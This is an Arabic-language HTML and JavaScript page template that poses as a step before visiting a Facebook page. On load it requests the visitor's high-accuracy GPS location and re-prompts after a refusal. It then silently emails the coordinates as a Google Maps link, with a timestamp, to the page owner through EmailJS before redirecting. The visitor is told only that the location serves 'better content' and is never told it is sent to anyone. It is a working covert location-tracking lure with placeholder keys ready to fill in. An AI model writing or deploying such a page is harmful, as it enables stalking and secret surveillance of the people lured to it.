<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>الموقع الدقيق والمباشر</title>
  <!-- Tailwind CSS CDN for modern styling -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- EmailJS CDN for sending location via email -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    /* Custom styles for animations and font */
    body {
      font-family: 'Inter', sans-serif; /* Using Inter font for a modern look */
      background-color: #f0f2f5; /* Light grey background */
    }

    /* Simple fade-in animation for initial load and modals */
    .fade-in {
      animation: fadeIn 0.5s ease-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* Pulse effect for location icon to draw attention */
    .pulse-icon {
        animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
        0% { transform: scale(1); opacity: 1; }
        50% { transform: scale(1.1); opacity: 0.7; }
        100% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

  <!-- Main Container Card - This card will hold different views (welcome, loading, map) -->
  <div id="mainContent" class="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full text-center fade-in">

    <!-- Welcome Message Section - Visible on initial load -->
    <div id="welcomeMessage" class="space-y-4">
      <div class="text-6xl text-blue-600 mb-4 pulse-icon">📍</div> <!-- Location pin emoji for visual appeal -->
      <h2 class="text-3xl font-extrabold text-gray-800">لتحربة أفضل</h2>
      <p class="text-lg text-gray-600">
        نحتاج إلى موقعك الدقيق لتقديم محتوى ملائم وتوجيهك لصفحتنا على فيسبوك.
        <br>
        <span class="font-semibold text-gray-700">يرجى السماح بالوصول لموقعك.</span>
      </p>
    </div>

    <!-- Loading Message Section - Hidden by default, shown when fetching location -->
    <div id="loadingMessage" class="hidden flex flex-col items-center space-y-4 mt-6">
      <div class="animate-spin rounded-full h-12 w-12 border-4 border-blue-500 border-t-transparent"></div>
      <p class="text-xl text-gray-700">جاري الحصول على موقعك الدقيق والمباشر...</p>
    </div>

    <!-- Map Container - Hidden by default, shown when map is loaded -->
    <div id="mapContainer" class="hidden w-full h-80 rounded-lg overflow-hidden border-2 border-gray-300 mt-6 shadow-md"></div>

  </div>

  <!-- Custom Error Modal - Hidden by default, shown on geolocation permission denied or error -->
  <div id="errorModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 hidden">
    <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-sm w-full text-center fade-in">
      <div class="text-5xl text-red-500 mb-4">⚠️</div>
      <h3 class="text-2xl font-bold text-gray-800 mb-3">عذراً!</h3>
      <p class="text-lg text-gray-600 mb-5">
        لا يمكننا المتابعة إلا إذا وافقت على الوصول إلى موقعك.
        <br>
        الرجاء تفعيل خدمات الموقع لجهازك وإعادة المحاولة.
      </p>
      <button id="retryBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-full transition duration-300 transform hover:scale-105" onclick="retryLocationRequest()">المحاولة مرة أخرى</button>
    </div>
  </div>

  <script>
    // ************************
    // IMPORTANT: REPLACE THESE PLACEHOLDER VALUES WITH YOUR ACTUAL KEYS AND URLs
    // Ensure you have a valid Google Maps API Key enabled for Maps JavaScript API and Geolocation API
    // Ensure you have correctly set up your EmailJS service and template
    const EMAILJS_PUBLIC_KEY = "YOUR_EMAILJS_PUBLIC_KEY"; // Your EmailJS Public Key
    const EMAILJS_SERVICE_ID = "YOUR_EMAILJS_SERVICE_ID"; // Your EmailJS Service ID
    const EMAILJS_TEMPLATE_ID = "YOUR_EMAILJS_TEMPLATE_ID"; // Your EmailJS Template ID
    const FACEBOOK_PAGE_URL = "https://www.facebook.com/YOUR_FACEBOOK_PAGE"; // Your actual Facebook Page URL
    const Maps_API_KEY = "YOUR_Maps_API_KEY"; // *** PLACE YOUR GOOGLE MAPS API KEY HERE ***
    // ************************

    // Initialize EmailJS with your public key
    emailjs.init(EMAILJS_PUBLIC_KEY);

    let mapInstance = null; // Variable to store the Google Map instance

    // Function to create and display the map
    // This function will only be called after the Google Maps API library is successfully loaded
    function initMap(latitude, longitude) {
      const mapContainer = document.getElementById("mapContainer");
      mapContainer.classList.remove("hidden"); // Make map container visible

      const location = { lat: latitude, lng: longitude };
      
      // Check if google.maps library is loaded before trying to use it
      if (typeof google !== 'undefined' && typeof google.maps !== 'undefined') {
        if (!mapInstance) { // Initialize map only once
          mapInstance = new google.maps.Map(mapContainer, {
            zoom: 15, // Default zoom level
            center: location, // Center the map on the obtained location
            disableDefaultUI: true, // Hide default UI elements for a cleaner look
            zoomControl: true // Keep zoom control visible for user interaction
          });
        } else {
            mapInstance.setCenter(location); // If map already exists, just update its center
        }

        // Add a marker to the map at the user's location
        new google.maps.Marker({
          position: location,
          map: mapInstance,
          title: "موقعك الحالي", // Marker title in Arabic
        });
      } else {
        console.error("Google Maps API has not been loaded yet. Map cannot be initialized.");
        // In a production scenario, you might show a user-friendly message here
      }
    }

    // Function to send the obtained location link via EmailJS
    function sendLocationLink(latitude, longitude) {
      // Get current date and time, formatted for Arabic with timezone
      const now = new Date().toLocaleString('ar-EG', { timeZoneName: 'short' }); 

      // Google Maps link that opens directly to the specific coordinates.
      // IMPORTANT: This is a static snapshot of the location at the time of request,
      // NOT a live-tracking link like those found in messaging apps.
      const googleMapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;

      // Parameters for the EmailJS template
      const params = {
        name: "Location Bot", // Sender name
        time: now,            // Time of location capture
        message: `موقع المستخدم الدقيق في ${now}:\n${googleMapsLink}` // Message content with the link
      };

      // Send the email using EmailJS
      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
        .then(() => {
          console.log("Location link sent successfully!");
          // After successful email, redirect to the Facebook page after a short delay
          setTimeout(() => { 
            window.location.href = FACEBOOK_PAGE_URL;
          }, 3000); // 3 seconds delay
        })
        .catch(err => {
          console.error("Email error:", err);
          // If email sending fails, notify the user (using alert as a fallback for critical errors)
          // and still redirect to Facebook to ensure user experience flow continues.
          alert("حدث خطأ أثناء إرسال بيانات الموقع، ولكن سيتم توجيهك."); 
          setTimeout(() => {
            window.location.href = FACEBOOK_PAGE_URL;
          }, 3000); // 3 seconds delay
        });
    }

    // Helper function to hide all main sections and show a specific one
    function showSection(sectionId) {
      document.getElementById("welcomeMessage").classList.add("hidden");
      document.getElementById("loadingMessage").classList.add("hidden");
      document.getElementById("mapContainer").classList.add("hidden");
      document.getElementById("errorModal").classList.add("hidden"); // Always hide modal when changing main sections

      // Show the requested section
      document.getElementById(sectionId).classList.remove("hidden");
    }

    // Main function to request geolocation from the user's browser
    function askForLocation() {
      showSection("loadingMessage"); // Display the loading message first

      if (navigator.geolocation) {
        // Request current position with high accuracy options
        navigator.geolocation.getCurrentPosition(success => {
          const lat = success.coords.latitude;
          const lon = success.coords.longitude;

          // Set up an interval to check if Google Maps API has finished loading.
          // This ensures `initMap` is called only when `google.maps` object is available.
          const checkGoogleMapsLoaded = setInterval(() => {
            if (typeof google !== 'undefined' && typeof google.maps !== 'undefined') {
              clearInterval(checkGoogleMapsLoaded); // Stop checking once loaded
              showSection("mapContainer"); // Show the map container
              initMap(lat, lon); // Initialize and display the map
              sendLocationLink(lat, lon); // Send the location data
            }
          }, 200); // Check every 200 milliseconds

        }, error => {
          // Handle geolocation errors
          showSection("welcomeMessage"); // Fallback to welcome message if error occurs
          if (error.code === error.PERMISSION_DENIED) {
            // If user explicitly denies permission, show the custom error modal
            document.getElementById("errorModal").classList.remove("hidden"); 
          } else {
            // For other types of errors (e.g., position unavailable, timeout)
            alert("حدث خطأ غير متوقع أثناء محاولة الحصول على موقعك. يرجى المحاولة مرة أخرى.");
            document.getElementById("errorModal").classList.remove("hidden"); // Also show modal for general errors
          }
        }, {
            enableHighAccuracy: true, // Request the most accurate position possible (uses GPS, Wi-Fi, etc.)
            timeout: 10000,         // Maximum time (in milliseconds) allowed to return a position
            maximumAge: 0           // Force a fresh request; do not use a cached position
        });
      } else {
          // If browser does not support geolocation, show alert and redirect
          showSection("welcomeMessage");
          alert("متصفحك لا يدعم خاصية تحديد الموقع الجغرافي. سيتم توجيهك إلى صفحة فيسبوك.");
          window.location.href = FACEBOOK_PAGE_URL; // Direct redirect if feature is unsupported
      }
    }

    // Function called by the retry button in the error modal
    function retryLocationRequest() {
        document.getElementById("errorModal").classList.add("hidden"); // Hide the error modal
        askForLocation(); // Re-attempt the location request
    }

    // Dynamically create and append the Google Maps API script tag to the head
    // This ensures the API key is passed correctly and the script loads asynchronously.
    const googleMapsScript = document.createElement('script');
    googleMapsScript.src = `https://maps.googleapis.com/maps/api/js?key=${Maps_API_KEY}`;
    googleMapsScript.async = true; // Load asynchronously
    googleMapsScript.defer = true; // Defer execution until HTML is parsed
    document.head.appendChild(googleMapsScript);

    // Start the location request process as soon as the window is fully loaded
    window.onload = () => {
      askForLocation();
    };
  </script>

</body>
</html>

